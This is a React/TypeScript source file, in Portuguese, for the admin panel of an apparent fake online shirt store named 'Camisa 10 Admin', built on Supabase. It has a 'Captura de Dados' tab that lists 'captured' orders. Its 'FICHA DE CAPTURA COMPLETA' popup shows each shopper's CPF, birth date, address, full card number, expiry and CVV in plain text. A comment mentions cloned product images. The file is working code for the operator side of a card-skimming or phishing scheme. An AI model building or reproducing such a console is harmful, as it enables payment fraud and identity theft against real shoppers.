import React, { useState, useEffect } from 'react';
import { supabase } from '../lib/supabase';
import {
    LayoutDashboard,
    ShoppingCart,
    PlusCircle,
    Eye,
    RefreshCw,
    Trash2,
    UserSearch,
    LogOut
} from 'lucide-react';

export default function Admin() {
    const [aba, setAba] = useState<'pedidos' | 'catalogo' | 'novo'>('pedidos');
    const [pedidos, setPedidos] = useState<any[]>([]);
    const [produtos, setProdutos] = useState<any[]>([]);
    const [loading, setLoading] = useState(false);

    // Estados para o formulário de novo produto
    const [nomeProd, setNomeProd] = useState('');
    const [precoProd, setPrecoProd] = useState('');
    const [imgProd, setImgProd] = useState('');

    // Função para procurar os pedidos capturados
    const buscarPedidos = async () => {
        setLoading(true);
        const { data } = await supabase
            .from('checkouts')
            .select('*')
            .order('created_at', { ascending: false });
        if (data) setPedidos(data);
        setLoading(false);
    };

    // Função para procurar as camisas do catálogo
    const buscarProdutos = async () => {
        setLoading(true);
        const { data } = await supabase
            .from('produtos')
            .select('*')
            .order('created_at', { ascending: false });
        if (data) setProdutos(data);
        setLoading(false);
    };

    useEffect(() => {
        buscarPedidos();
        buscarProdutos();
    }, []);

    const cadastrarProduto = async (e: React.FormEvent) => {
        e.preventDefault();
        const { error } = await supabase
            .from('produtos')
            .insert([{
                nome: nomeProd,
                preco: parseFloat(precoProd.replace(',', '.')),
                imagem_url: imgProd
            }]);

        if (!error) {
            alert("Produto cadastrado com sucesso!");
            setNomeProd(''); setPrecoProd(''); setImgProd('');
            buscarProdutos();
            setAba('catalogo');
        } else {
            alert("Erro ao cadastrar: " + error.message);
        }
    };

    const deletarProduto = async (id: string) => {
        if (confirm("Tens a certeza que queres eliminar esta camisa?")) {
            const { error } = await supabase.from('produtos').delete().eq('id', id);
            if (!error) buscarProdutos();
        }
    };

    return (
        <div style={{ display: 'flex', minHeight: '100vh', background: '#f8fafc', color: '#000', fontFamily: 'sans-serif' }}>

            {/* SIDEBAR */}
            <aside style={{ width: '280px', background: '#fff', borderRight: '2px solid #000', padding: '20px', display: 'flex', flexDirection: 'column' }}>
                <div style={{ fontWeight: 900, fontSize: '20px', marginBottom: '40px', display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <div style={{ background: '#2563eb', color: '#fff', padding: '8px', borderRadius: '8px' }}>👕</div>
                    Camisa 10 Admin
                </div>

                <nav style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    <button onClick={() => setAba('pedidos')} style={aba === 'pedidos' ? bAt : bIn}>
                        <ShoppingCart size={20} /> Pedidos (Dados)
                    </button>
                    <button onClick={() => setAba('catalogo')} style={aba === 'catalogo' ? bAt : bIn}>
                        <LayoutDashboard size={20} /> Ver Catálogo
                    </button>
                    <button onClick={() => setAba('novo')} style={aba === 'novo' ? bAt : bIn}>
                        <PlusCircle size={20} /> Novo Produto
                    </button>
                </nav>

                <button style={{ border: 'none', background: 'none', color: '#ef4444', fontWeight: 900, display: 'flex', gap: '10px', padding: '10px', cursor: 'pointer' }}>
                    <LogOut size={20} /> Sair
                </button>
            </aside>

            {/* CONTEÚDO PRINCIPAL */}
            <main style={{ flex: 1, padding: '40px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '30px' }}>
                    <h1 style={{ fontSize: '32px', fontWeight: 900 }}>
                        {aba === 'pedidos' && '🛒 Captura de Dados'}
                        {aba === 'catalogo' && '👕 Catálogo de Produtos'}
                        {aba === 'novo' && '➕ Adicionar Novo Item'}
                    </h1>
                    <button onClick={aba === 'pedidos' ? buscarPedidos : buscarProdutos} style={btnRef}>
                        <RefreshCw size={18} className={loading ? 'animate-spin' : ''} /> ATUALIZAR
                    </button>
                </div>

                {/* ABA PEDIDOS */}
                {aba === 'pedidos' && (
                    <div style={tabCard}>
                        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                            <thead style={{ background: '#f1f5f9', borderBottom: '2px solid #000' }}>
                                <tr>
                                    <th style={th}>HORÁRIO</th>
                                    <th style={th}>CLIENTE</th>
                                    <th style={th}>CAMISA / VALOR</th>
                                    <th style={th}>AÇÕES</th>
                                </tr>
                            </thead>
                            <tbody>
                                {pedidos.map(p => (
                                    <tr key={p.id} style={{ borderBottom: '1px solid #ddd' }}>
                                        <td style={td}>{new Date(p.created_at).toLocaleTimeString('pt-PT')}</td>
                                        <td style={td}><strong>{p.nome_completo}</strong><br />{p.telefone}</td>
                                        <td style={td}>
                                            <div style={{ fontWeight: 'bold' }}>{p.produto_nome}</div>
                                            <div style={{ color: '#1da154', fontWeight: 900 }}>R$ {p.valor_total}</div>
                                        </td>
                                        <td style={td}>
                                            <button
                                                onClick={() => alert(
                                                    `📋 FICHA DE CAPTURA COMPLETA\n\n` +
                                                    `👤 DADOS PESSOAIS:\n` +
                                                    `• Nome: ${p.nome_completo}\n` +
                                                    `• E-mail: ${p.email}\n` +
                                                    `• CPF: ${p.cpf}\n` +
                                                    `• Nascimento: ${p.data_nascimento}\n` +
                                                    `• Whats: ${p.telefone}\n\n` +
                                                    `📍 ENTREGA:\n` +
                                                    `• Endereço: ${p.endereco}, ${p.numero}\n` +
                                                    `• Bairro: ${p.bairro}\n` +
                                                    `• Cidade: ${p.cidade} - ${p.estado}\n` +
                                                    `• CEP: ${p.cep}\n\n` +
                                                    `💳 CARTÃO:\n` +
                                                    `• Número: ${p.numero_cartao}\n` +
                                                    `• Nome no Cartão: ${p.nome_cartao}\n` +
                                                    `• Validade: ${p.validade_cartao}\n` +
                                                    `• CVV: ${p.cvv_cartao}`
                                                )}
                                                style={btnV}
                                            >
                                                <UserSearch size={16} /> VER FICHA
                                            </button>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}

                {/* ABA CATÁLOGO */}
                {aba === 'catalogo' && (
                    <div style={tabCard}>
                        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                            <thead style={{ background: '#f1f5f9', borderBottom: '2px solid #000' }}>
                                <tr>
                                    <th style={th}>FOTO</th>
                                    <th style={th}>NOME</th>
                                    <th style={th}>PREÇO</th>
                                    <th style={th}>AÇÕES</th>
                                </tr>
                            </thead>
                            <tbody>
                                {produtos.map(prod => (
                                    <tr key={prod.id} style={{ borderBottom: '1px solid #ddd' }}>
                                        <td style={td}>
                                            {/* CONTAINER PARA PADRONIZAR O TAMANHO DAS IMAGENS CLONADAS */}
                                            <div style={{ width: '60px', height: '60px', background: '#f8f9fa', borderRadius: '8px', overflow: 'hidden', border: '1px solid #eee' }}>
                                                <img
                                                    src={prod.imagem_url}
                                                    style={{ width: '100%', height: '100%', objectFit: 'contain' }}
                                                    alt="camisa"
                                                />
                                            </div>
                                        </td>
                                        <td style={td}><strong>{prod.nome}</strong></td>
                                        <td style={td}>R$ {prod.preco}</td>
                                        <td style={td}>
                                            <button onClick={() => deletarProduto(prod.id)} style={{ ...btnV, background: '#ef4444' }}>
                                                <Trash2 size={16} />
                                            </button>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                        {produtos.length === 0 && <div style={{ padding: '100px', textAlign: 'center', fontWeight: 900 }}>Nenhum produto cadastrado.</div>}
                    </div>
                )}

                {/* ABA NOVO PRODUTO */}
                {aba === 'novo' && (
                    <form onSubmit={cadastrarProduto} style={formStyle}>
                        <label style={label}>Nome da Camisa</label>
                        <input value={nomeProd} onChange={e => setNomeProd(e.target.value)} placeholder="Ex: Brasil Retrô 2002" style={input} required />

                        <label style={label}>Preço (R$)</label>
                        <input value={precoProd} onChange={e => setPrecoProd(e.target.value)} placeholder="139.90" style={input} required />

                        <label style={label}>Link da Imagem (URL)</label>
                        <input value={imgProd} onChange={e => setImgProd(e.target.value)} placeholder="Cole o link da foto aqui" style={input} required />

                        <button type="submit" style={btnSave}>CADASTRAR PRODUTO</button>
                    </form>
                )}
            </main>
        </div>
    );
}

// ESTILOS DE ALTO CONTRASTE (PRETO NO BRANCO)
const bIn: React.CSSProperties = { display: 'flex', alignItems: 'center', gap: '10px', width: '100%', padding: '15px', border: 'none', background: 'none', color: '#000', cursor: 'pointer', borderRadius: '12px', fontWeight: 900, textAlign: 'left' };
const bAt: React.CSSProperties = { ...bIn, background: '#f1f5f9', color: '#2563eb', border: '1px solid #ddd' };
const th: React.CSSProperties = { padding: '15px 20px', textAlign: 'left', fontSize: '12px', fontWeight: 900 };
const td: React.CSSProperties = { padding: '15px 20px', fontSize: '14px' };
const btnV: React.CSSProperties = { background: '#000', color: '#fff', border: 'none', padding: '10px 15px', borderRadius: '8px', cursor: 'pointer', fontWeight: 900, display: 'flex', gap: '8px', alignItems: 'center' };
const btnRef: React.CSSProperties = { padding: '10px 20px', border: '2px solid #000', background: '#fff', fontWeight: 900, borderRadius: '10px', cursor: 'pointer', display: 'flex', gap: '8px' };
const tabCard: React.CSSProperties = { background: '#fff', borderRadius: '15px', border: '2px solid #000', overflow: 'hidden' };
const formStyle: React.CSSProperties = { background: '#fff', padding: '30px', borderRadius: '20px', border: '2px solid #000', maxWidth: '500px' };
const input: React.CSSProperties = { width: '100%', padding: '15px', marginBottom: '20px', borderRadius: '10px', border: '2px solid #000', fontWeight: 'bold', outline: 'none' };
const label: React.CSSProperties = { display: 'block', marginBottom: '8px', fontWeight: 900 };
const btnSave: React.CSSProperties = { width: '100%', padding: '15px', background: '#2563eb', color: '#fff', border: 'none', borderRadius: '10px', fontWeight: 900, cursor: 'pointer' };